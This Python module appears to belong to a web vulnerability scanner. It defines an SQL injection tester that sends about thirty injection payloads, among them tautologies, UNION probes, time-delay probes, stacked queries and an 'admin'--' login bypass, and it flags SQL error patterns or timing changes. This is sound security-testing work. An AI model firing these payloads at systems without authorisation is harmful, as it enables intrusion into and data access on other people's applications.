import re
from injectors.base import BaseInjector
from models.scan_config import VulnerabilityReport


class SQLInjector(BaseInjector):
    """SQL injection testing — MySQL, PostgreSQL, SQLite, MSSQL."""

    name = "sql"
    description = "Tests for SQL injection vulnerabilities across common SQL dialects"

    # Regex patterns that indicate a SQL error leaked into the response
    ERROR_PATTERNS = [
        # MySQL
        r"you have an error in your sql syntax",
        r"warning.*mysql",
        r"unclosed quotation mark",
        r"mysql_fetch",
        r"mysql_num_rows",
        # PostgreSQL
        r"pg_query",
        r"pg_exec",
        r"postgresql.*error",
        r"unterminated quoted string",
        r"syntax error at or near",
        # SQLite
        r"sqlite3\.OperationalError",
        r"unrecognized token",
        r"near \".*\": syntax error",
        # MSSQL
        r"microsoft.*odbc.*sql server",
        r"unclosed quotation mark after the character string",
        r"\[sql server\]",
        # Generic
        r"sql syntax.*error",
        r"sql error",
        r"ora-\d{5}",
        r"quoted string not properly terminated",
    ]

    def generate_payloads(self, context: dict) -> list[str]:
        return [
            # ── Error-based ──
            "'",
            '"',
            "' OR '1'='1",
            '" OR "1"="1',
            "' OR 1=1--",
            '" OR 1=1--',
            "' OR 1=1#",
            "') OR ('1'='1",
            "') OR 1=1--",
            # ── UNION probing ──
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            # ── Boolean-blind ──
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND 'a'='a",
            "' AND 'a'='b",
            # ── Time-blind ──
            "' AND SLEEP(3)--",
            "'; WAITFOR DELAY '0:0:3'--",
            "' AND pg_sleep(3)--",
            "' || (SELECT CASE WHEN 1=1 THEN pg_sleep(3) ELSE pg_sleep(0) END)--",
            # ── Stacked queries ──
            "'; SELECT 1--",
            "'; SELECT pg_sleep(3)--",
            # ── ORDER BY probing ──
            "1' ORDER BY 1--",
            "1' ORDER BY 10--",
            "-1' UNION SELECT 1--",
            "admin'--",
            # ── URL-encoded variants ──
            "%27%20OR%201%3D1--",
            "%22%20OR%201%3D1--",
        ]

    def analyze_response(
        self, baseline: dict, test_response: dict, payload: str
    ) -> VulnerabilityReport:
        evidence: list[str] = []
        is_vulnerable = False
        confidence = "low"

        body = test_response.get("body", "").lower()
        baseline_body = baseline.get("body", "").lower()
        test_time = test_response.get("response_time_ms", 0)
        baseline_time = baseline.get("response_time_ms", 0)
        test_status = test_response.get("status_code", 0)
        baseline_status = baseline.get("status_code", 0)

        # 1. SQL error leak
        for pattern in self.ERROR_PATTERNS:
            if re.search(pattern, body, re.IGNORECASE):
                if not re.search(pattern, baseline_body, re.IGNORECASE):
                    evidence.append(f"SQL error pattern: {pattern}")
                    is_vulnerable = True
                    confidence = "high"

        # 2. Time-blind
        time_keywords = ("SLEEP", "WAITFOR", "pg_sleep")
        if any(kw in payload.upper() for kw in time_keywords):
            if test_time > baseline_time + 2500:
                evidence.append(
                    f"Time-based: {test_time:.0f}ms vs baseline {baseline_time:.0f}ms"
                )
                is_vulnerable = True
                confidence = "high"

        # 3. Boolean-blind
        if "AND 1=2" in payload or "'a'='b" in payload:
            if len(body) != len(baseline_body) or test_status != baseline_status:
                evidence.append("Boolean false differs from baseline")
                is_vulnerable = True
                confidence = "medium"

        # 4. UNION — extra content returned
        if "UNION" in payload.upper():
            if test_status == 200 and len(body) > len(baseline_body) + 50:
                evidence.append("UNION query returned additional content")
                is_vulnerable = True
                confidence = "medium"

        # 5. Server error triggered
        if test_status == 500 and baseline_status != 500:
            evidence.append(f"500 error triggered (baseline was {baseline_status})")
            if not is_vulnerable:
                is_vulnerable = True
                confidence = "medium"

        return VulnerabilityReport(
            is_vulnerable=is_vulnerable,
            confidence=confidence,
            details="; ".join(evidence) if evidence else "No indicators found",
            evidence=evidence,
        )
